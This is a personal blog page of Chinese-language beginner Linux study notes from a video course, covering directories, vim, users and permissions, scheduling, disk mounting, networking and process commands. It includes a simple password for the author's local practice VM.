<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://huyaoyao2019.github.io/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">

  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
  
<meta name="generator" content="Hexo 6.3.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
        
          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
        
        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://huyaoyao2019.github.io"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main">
  
    <article id="post-编程语言" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/07/05/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/" class="article-date">
  <time class="dt-published" datetime="2023-07-05T15:33:56.585Z" itemprop="datePublished">2023-07-05</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">韩顺平linux</span><br><span class="line">https://www.bilibili.com/video/BV1Sv411r7vd</span><br><span class="line"></span><br><span class="line">ssh root#192.168.213.135</span><br><span class="line">123456Hyy</span><br><span class="line">ssh hyy19#192.168.213.135</span><br><span class="line">123</span><br><span class="line">linux是内核 --服务器</span><br><span class="line">发行版本ubuntu(python) centos</span><br></pre></td></tr></table></figure>

<h3 id="p6-centos安装"><a href="#p6-centos安装" class="headerlink" title="p6 centos安装"></a>p6 centos安装</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">i5-10600KF		2个cpu?核心12线程 </span><br><span class="line">/boot引导分区			    1G		文件系统ext4</span><br><span class="line">/swap分区临时充当内存分区		2G</span><br><span class="line">/根分区 剩下的</span><br></pre></td></tr></table></figure>

<h3 id="p7-三种网络模式"><a href="#p7-三种网络模式" class="headerlink" title="p7 三种网络模式"></a>p7 三种网络模式</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">桥接模式</span><br><span class="line">	虚拟系统可以和外部系统通讯，但是容易造成IP冲突，比如192.168.0网段只有254个ip（0，255不可用）</span><br><span class="line">NAT</span><br><span class="line">	网络地址转换模式，搞了个网关，可以和外部通讯，不会造成ip冲突，但是外部网络不能主动访问虚拟的Linux</span><br><span class="line">主机</span><br><span class="line">	独立的系统</span><br></pre></td></tr></table></figure>

<p>虚拟机共享文件夹没搞明白。。</p>
<h3 id="p12-目录结构"><a href="#p12-目录结构" class="headerlink" title="p12 目录结构"></a>p12 目录结构</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">/bin 常使用命令</span><br><span class="line">/sbin</span><br><span class="line">/home 用户目录</span><br><span class="line">useradd jack</span><br><span class="line">userdel -r jack</span><br><span class="line">/root</span><br><span class="line">/lib 系统开机所需要最基本的动态连接共享库，作用类似于windows的dll</span><br><span class="line">/lost+found 一般为空，系统非法关机后这会存放一些文件</span><br><span class="line">/etc 所有的系统管理所需要的配置文件和子目录my.conf</span><br><span class="line">/usr 用户应用程序和文件 同windowsprog files</span><br><span class="line">/usr/local 给主机额外安装软件所安装的目录 一般通过编译源码方式安装的程序</span><br><span class="line">/boot 启动linux核心文件 连接文件和镜像文件</span><br><span class="line">/proc 虚拟的目录 系统内存的映射 访问目录获取系统信息 不能动</span><br><span class="line">/srv service 存放服务启动后需要提取的数据 不能动</span><br><span class="line">/sys linux2.6内核的一个变化 该目录安装了2.6内核中新出现的文件系统sysfs 不能动</span><br><span class="line">/tmp 临时文件</span><br><span class="line">/dev 类似windows的设备管理器 所有硬件用文件形式存储</span><br><span class="line">/media linux自动识别一些设备 如u盘 光驱 识别后会把识别的设备挂载到这个目录下</span><br><span class="line">/mnt 为了让用户临时挂载别的文件系统 可以把外部存储挂载的/mnt上</span><br><span class="line">/opt 给主机额外安装软件摆放的目录 比如oracle数据库</span><br><span class="line">/var 各种日志</span><br><span class="line">/selinux 安全子系统 能控制程序只能访问特定文件</span><br></pre></td></tr></table></figure>

<h3 id="p16-Vi-Vim"><a href="#p16-Vi-Vim" class="headerlink" title="p16 Vi Vim"></a>p16 Vi Vim</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">正常模式</span><br><span class="line">	删除字符 删除整行 复制黏贴</span><br><span class="line">插入模式</span><br><span class="line">	正常到插入模式i I o O a A r R</span><br><span class="line">命令行模式</span><br><span class="line">    esc从插入退出到正常模式</span><br><span class="line">    :或/从正常模式切换到命令行模式</span><br><span class="line">    命令行模式wq  (write quit)</span><br><span class="line">    :q :q!(强制退出，不保存)</span><br><span class="line">快捷键</span><br><span class="line">	1.拷贝当前行yy 5yy拷贝当前行向下5行 黏贴为p</span><br><span class="line">	2.删除当前行dd 5dd删除当前行向下5行</span><br><span class="line">	3.普通模式下/a 搜索a  n为下一个</span><br><span class="line">	4.一般模式:set nu设置行号 :set nonu取消行号</span><br><span class="line">	5.一般模式[G]最末行 [gg]首行</span><br><span class="line">	6.一般模式 u撤销</span><br><span class="line">	7.一般模式 45 shift+g快速定位到45行</span><br></pre></td></tr></table></figure>

<h3 id="p19关机重启"><a href="#p19关机重启" class="headerlink" title="p19	关机重启"></a>p19	关机重启</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">shutdown -h now		立刻关机		(halt)</span><br><span class="line">shutdown -h 1		1分钟关机</span><br><span class="line">shutdown -r now    					(reboot)</span><br><span class="line">halt</span><br><span class="line">reboot</span><br><span class="line">sync		内存数据同步到磁盘</span><br></pre></td></tr></table></figure>

<h3 id="p20登录注销"><a href="#p20登录注销" class="headerlink" title="p20	登录注销"></a>p20	登录注销</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su登录</span><br><span class="line">logout注销</span><br></pre></td></tr></table></figure>

<h3 id="p21用户管理"><a href="#p21用户管理" class="headerlink" title="p21	用户管理"></a>p21	用户管理</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">useradd 用户名 自动创建家目录，且自动切换到该目录</span><br><span class="line">useradd -d 指定目录</span><br><span class="line">passwd 用户名	指定密码</span><br><span class="line">who am i 显示第一次登录到的信息</span><br><span class="line">groupadd 组名 新增组</span><br><span class="line">groupdel 组名 删除组</span><br><span class="line">usermod -g 用户组 用户名</span><br></pre></td></tr></table></figure>

<h4 id="用户和组相关文件"><a href="#用户和组相关文件" class="headerlink" title="用户和组相关文件"></a>用户和组相关文件</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/etc/passwd</span><br><span class="line">	用户配置文件，记录用户各种信息</span><br><span class="line">	用户名:口令:用户标识号:组标识号:注释性描述:主目录:登录shell</span><br><span class="line">/etc/shadow</span><br><span class="line">	口令配置文件</span><br><span class="line">	登录名:加密口令:最后一次修改时间:最小时间间隔:最大时间间隔:警告时间:不活动时间:失效时间:标志</span><br><span class="line">/etc/group</span><br><span class="line">	组配置文件</span><br><span class="line">	组名:口令:组标识号:组内用户列表</span><br></pre></td></tr></table></figure>

<h3 id="p26-如何找回root密码"><a href="#p26-如何找回root密码" class="headerlink" title="p26 如何找回root密码"></a>p26 如何找回root密码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/Snowflake1997/article/details/121498049</span><br></pre></td></tr></table></figure>

<h3 id="p27-命令"><a href="#p27-命令" class="headerlink" title="p27 命令"></a>p27 命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">man ls		man获得帮助信息</span><br><span class="line">help 		获得shell内置的帮助信息</span><br><span class="line">pwd			显示当前工作目录绝对路径</span><br><span class="line">ls  		-a显示全部  -l以列表形式</span><br><span class="line">cd ~</span><br><span class="line">cd ..</span><br><span class="line">mkdir		创建文件夹			-p创建多级目录</span><br><span class="line">rmdir  		删除空目录			rm -rf强制删除非空目录</span><br><span class="line">touch		创建空文件</span><br><span class="line">cp [选项]	source destination		-r递归复制 相当于复制有文件的文件夹</span><br><span class="line">\cp 强制覆盖 可能会有相同的文件要选择yes</span><br><span class="line">rm 移除文件或目录 			-r递归删除整个文件夹 -f强制不提示</span><br><span class="line">mv 移动文件或者重命名 		mv oldNameFile newNameFile</span><br><span class="line">cat 查看文件内容 		-n显示行号</span><br><span class="line">cat hello.txt | more		管道命令把前面的结果交给下面处理</span><br><span class="line">more space向下一页enter一行q退出 ctrl+f向下一屏 ctrl+b上一屏</span><br><span class="line">less 分屏查看</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/05/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/1665241096035.png" alt="1665241096035"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">echo 输出内容到控制台 			echo $PATH 		echo $HOSTNAME环境变量</span><br><span class="line">head 默认显示前10行内容			-n 行数</span><br><span class="line">tail 默认尾10行内容		      -n 行数 -f实时追踪文件更新</span><br><span class="line">&gt; 输出重定向 覆盖</span><br><span class="line">&gt;&gt; 追加 末尾</span><br><span class="line">ln 软链接 类似windows里的快捷方式		ln -s [源文件或目录] [软链接名] rm删除</span><br><span class="line">history 查看执行过的历史命令</span><br></pre></td></tr></table></figure>

<h3 id="p34-时间日期指令"><a href="#p34-时间日期指令" class="headerlink" title="p34 时间日期指令"></a>p34 时间日期指令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cal 日历</span><br><span class="line">date</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="p35-查找"><a href="#p35-查找" class="headerlink" title="p35 查找"></a>p35 查找</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">find /root -name hello2.txt		-name 被查找文件名</span><br><span class="line">find /opt -user root			-user 查找root用户创建的文件</span><br><span class="line">		-size （+n 大于 -n小于 n等于）</span><br><span class="line">locate快速定位文件</span><br><span class="line">	首次使用需要updatedb     locate hello2.txt</span><br><span class="line">which 查找指令位置</span><br><span class="line">	which reboot		which ls</span><br><span class="line">grep 过滤查找</span><br></pre></td></tr></table></figure>

<h3 id="p37-压缩解压"><a href="#p37-压缩解压" class="headerlink" title="p37 压缩解压"></a>p37 压缩解压</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">gzip 压缩为*.gz</span><br><span class="line">gunzip 解压*.gz文件</span><br><span class="line"></span><br><span class="line">zip unzip *.zip		-d指定解压后文件的存放目录	-r递归压缩目录</span><br><span class="line"></span><br><span class="line">tar	*.tar.gz</span><br><span class="line">	-c 产生.tar打包文件</span><br><span class="line">	-v 显示详细信息</span><br><span class="line">	-f 指定压缩后的文件名</span><br><span class="line">	-z 打包同时压缩</span><br><span class="line">	-x 解压.tar文件</span><br><span class="line">	tar -zcvf hello.tar.gz hello2.txt hello3.txt		压缩</span><br><span class="line">	tar -zxvf hhh.tar.gz								解压</span><br></pre></td></tr></table></figure>

<h3 id="p40-组管理和权限管理"><a href="#p40-组管理和权限管理" class="headerlink" title="p40 组管理和权限管理"></a>p40 组管理和权限管理</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">ls -ahl 查看文件所有者 ll ls -l</span><br><span class="line">chgrp root hyy19.txt	更改文件所在组</span><br><span class="line">其他组 除文件所有者和所在组的用户外，系统的其他用户都是文件的其他组</span><br><span class="line">usermod -g 组名 用户名			改变用户所在组</span><br><span class="line">usermod -d 目录名 用户名			改变用登录初始目录</span><br><span class="line"></span><br><span class="line">drwxr-xr-x. 2 root  root 6 5月  11 14:06 6508</span><br><span class="line">ll /dev 设备文件</span><br><span class="line">第0位 l链接 d目录 c字符设备文件，鼠标键盘 b块设备，比如硬盘</span><br><span class="line">1-3		所有者权限		读写执行</span><br><span class="line">4-6		组权限</span><br><span class="line">7-9		其他用户权限</span><br><span class="line">权限后的数字表示文件夹内文件综合包括文件夹</span><br><span class="line">chmod 777 文件名 		r=4 w=2 x=1</span><br><span class="line">chown 修改文件所有者</span><br><span class="line">	chown hyy19 Hello.java  更改文件所有者 高级权限可改</span><br><span class="line">useradd创建的/home/新用户文件夹所在组和其他组没有访问权限，只有所有者和管理员有权限</span><br></pre></td></tr></table></figure>

<h3 id="p52-任务调度"><a href="#p52-任务调度" class="headerlink" title="p52 任务调度"></a>p52 任务调度</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">概述：指系统在某个时间执行的特定的命令或程序</span><br><span class="line">任务调度分类：</span><br><span class="line">	1.系统工作 须周而复始地执行 病毒扫描</span><br><span class="line">	2.个别用户工作 mysql数据库备份</span><br><span class="line">基本语法</span><br><span class="line">	crontab</span><br><span class="line">		-e 编辑crontab定时任务</span><br><span class="line">			*/1 * * * * ls -l /etc/ &gt; /tmp/to.txt</span><br><span class="line">		-l 查询crontab任务</span><br><span class="line">		-r 删除当前用户所有的crontab任务</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/05/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/1665304721583.png" alt="1665304721583"></p>
<p><img src="/2023/07/05/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/1665305280985.png" alt="1665305280985"><img src="/2023/07/05/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/1665305395338.png" alt="1665305395338"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">一次性定时任务</span><br><span class="line">	at命令是一次性定时任务 at守护进程atd回忆后台模式来运行</span><br><span class="line">	使用ps -ef | grep atd</span><br><span class="line">	</span><br><span class="line">    2天后下午5点执行 /bin/ls /home</span><br><span class="line">    	at 5pm + 2 days			回车</span><br><span class="line">    	/bin/ls /home			ctrl+d 2次</span><br><span class="line">    atq命令来查看系统中没有执行的工作任务</span><br><span class="line">    	命令行atq</span><br><span class="line">    明天17点种，输出时间到指定文件内 比如/root/date100.log</span><br><span class="line">    	at 5pm tomorrow</span><br><span class="line">    	date &gt; /root/date100.log</span><br><span class="line">    2分钟后，输出时间到指定文件 比如/root/date200.log</span><br><span class="line">    	at now + 2 minutes</span><br><span class="line">    删除已经设置的任务，atrm编号</span><br><span class="line">    	atrm [编号]</span><br></pre></td></tr></table></figure>

<h3 id="p58磁盘分区"><a href="#p58磁盘分区" class="headerlink" title="p58磁盘分区"></a>p58磁盘分区</h3><p><img src="/2023/07/05/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/1665308679584.png" alt="1665308679584"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">挂载分区 lsblk</span><br><span class="line">	2种硬盘 IDE硬盘和SCSI硬盘 目前主要是SCSI</span><br><span class="line">	IDE		hdx~   x为盘号（a为基本盘 b为基本从属盘 c为辅助主盘 d为辅助从属盘），~表示分区1-4为主分区和扩展分区，5为逻辑分区，e.g.hda3表示第一个（a）IDE硬盘第三个分区，hdb2第二个（b）IDE硬盘第二个分区</span><br><span class="line">	SCSI 	sdx~</span><br><span class="line">	lsblk -f</span><br><span class="line">	mountpoint 挂载点</span><br><span class="line">在vmware设置中可以添加硬盘 重启后 lsblk就可以看到 sdb了</span><br><span class="line">fdisk /dev/sdb		开始对sdb硬盘挂载		fdisk /dev/sda则对sda硬盘挂载</span><br><span class="line">然后根据提示来		基本默认选择</span><br><span class="line">	m 显示命令列表</span><br><span class="line">	p 显示磁盘分区</span><br><span class="line">	n 新增分区</span><br><span class="line">	d 删除分区</span><br><span class="line">	w 写入并退出</span><br><span class="line">	....（此处有省略）</span><br><span class="line">分区需要格式化才能用		会增加uuid  此处sdb1 “1”是刚才选择新增的第一个分区</span><br><span class="line">	mkfs -t ext4 /dev/sdb1			ext4是分区类型		此时uuid添加完毕</span><br><span class="line">	mount /dev/sdb1 /newdisk		此时是临时挂载，重启后挂载会掉下来</span><br><span class="line">	vim打开/dev/fstab 按如下修改然后重启或者mount -a  此处文件类型不能ext4否则报错重启不了</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/05/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/1665324453590.png" alt="1665324453590"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">df -h	可以查看磁盘使用情况</span><br><span class="line">查询指定目录的磁盘占用情况</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/05/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/1665325658423.png" alt="1665325658423"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ls -l | grep &quot;^-&quot;	抓取开头“-”</span><br><span class="line">ls -l | grep &quot;^-&quot; | wc -l		查看当前目录文件数量</span><br><span class="line">ls -l | grep &quot;^d&quot; | wc -l		查看当前目录目录数量</span><br><span class="line">ls -lR | grep &quot;^-&quot; | wc -l		查看当前目录以及子目录下文件数量</span><br><span class="line">tree /home	显示树状目录	如果没有tree指令使用哦那个yum install tree</span><br><span class="line"></span><br><span class="line">注意ll不显示隐藏文件，须ll -a或ls -all</span><br></pre></td></tr></table></figure>

<h3 id="p63-网络配置"><a href="#p63-网络配置" class="headerlink" title="p63 网络配置"></a>p63 网络配置</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">已知虚拟机ip 192.168.213.135   本地VMnet8 192.168.213.1</span><br><span class="line">虚拟机可以ping本地</span><br><span class="line">本地ping虚拟机 需要关闭本地公网防火墙	</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/05/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/1665328193812.png" alt="1665328193812"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">有线以太网适配器 192.168.31.236 默认网关192.168.31.1</span><br><span class="line">网关与互联网相连</span><br><span class="line">本地VMnet8通过有线网卡代理了  ----NAT</span><br><span class="line"></span><br><span class="line">在VMware-》编辑-》虚拟网络编辑器   可配置网络配置</span><br><span class="line">可以在如下控制面板中配置 单机属性</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/05/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/1665329046674.png" alt="1665329046674"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">dhcp为自动分配 但可能导致每次分配的ip不一样，如果搞服务器集群的话</span><br><span class="line">static指定ip</span><br><span class="line">	vim /etc/sysconfig/network-scripts/ifcfg-ens33	如下图所示</span><br><span class="line">	改完之后需要在VMware-》编辑-》虚拟网络编辑器中讲子网改为192.168.213.0以及讲NAT网关改为对应的192.168.213.2</span><br><span class="line">	然后systemctl restart network或者重启</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/05/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/1665367231117.png" alt="1665367231117"></p>
<h3 id="p66-主机名与hosts映射"><a href="#p66-主机名与hosts映射" class="headerlink" title="p66 主机名与hosts映射"></a>p66 主机名与hosts映射</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hostname			查询主机名</span><br><span class="line">vim /etc/hostname	修改主机名</span><br><span class="line">设置主机名与hosts映射		DNS域名系统</span><br><span class="line">	windows中C:\Windows\System32\drivers\etc\hosts文件指定</span><br><span class="line">	linux中/etc/hosts指定</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">e.g. /etc/hosts添加192.168.213.1 hyy511   后面的主机名是单向的，ping主机名解析到前面的ip</span><br><span class="line">此时关闭windows防火墙ping就通了</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">浏览器中输入网址</span><br><span class="line">	浏览器会先检查浏览器缓存中是否有该酩解析IP，若没有接检查操作系统DNS解析器缓存这两个缓存称为本地解析器缓存</span><br><span class="line">	第一次成功访问后浏览器或操作系统会缓存他的ip地址</span><br><span class="line">	windows中输入</span><br><span class="line">		ipconfig /displaydns		//DNS域名解析缓存</span><br><span class="line">		ipconfig /flushdns			//手动清理dns缓存</span><br><span class="line">	若本地解析器缓存没有找到对应映射，检查系统中hosts文件中有没有对应的域名IP映射</span><br><span class="line">	若本地DNS解析器缓存喝hosts文件均没有找到对应ip，则至域名服务DNS进行解析域</span><br><span class="line">	</span><br></pre></td></tr></table></figure>

<h3 id="p68-进程管理"><a href="#p68-进程管理" class="headerlink" title="p68 进程管理"></a>p68 进程管理</h3><h4 id="ps"><a href="#ps" class="headerlink" title="ps"></a>ps</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">每个执行的程序都是一个进程，每个都有一个pid号</span><br><span class="line">windows的资源监视器</span><br><span class="line">top指令</span><br><span class="line">ps</span><br><span class="line">	ps -aux | more</span><br><span class="line">        PID 进程识别号</span><br><span class="line">        TTY 终端机号</span><br><span class="line">        TIME 此进程所消CPU时间</span><br><span class="line">        CMD 正在执行的命令或进程名</span><br><span class="line">        STAT 状态  %CPU  %MEM  VSZ虚拟内存  RSS物理内存</span><br><span class="line">        -a 显示当前终端多有进程信息</span><br><span class="line">        -u 以用户格式显示</span><br><span class="line">        -x 显示后台进程运行参数</span><br><span class="line">  	ps -ef	以全格式显示当前所有进程，查看进程父进程</span><br><span class="line">  		-e 显示所有进程</span><br><span class="line">  		-f 全格式</span><br><span class="line">  		PPID 父进程ID</span><br><span class="line">  		C CPU用于计算执行优先级的因子。数值大，优先级小</span><br><span class="line">  		STIME 启动时间</span><br></pre></td></tr></table></figure>

